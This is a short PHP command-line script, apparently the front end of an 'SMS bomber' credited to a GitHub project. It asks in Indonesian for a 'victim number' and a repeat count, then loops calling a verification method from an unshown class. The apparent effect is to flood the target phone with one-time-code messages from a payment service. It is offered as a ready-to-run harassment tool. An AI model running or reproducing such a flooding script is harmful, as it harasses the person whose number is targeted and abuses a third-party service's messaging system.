<?php
include '1.php';

/*
    https://github.com/nee48/BomSmsZipay
    Made by Handika Pratama
    Modified by ./CE.19
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Korban (tanpa 0/62)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Santet\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
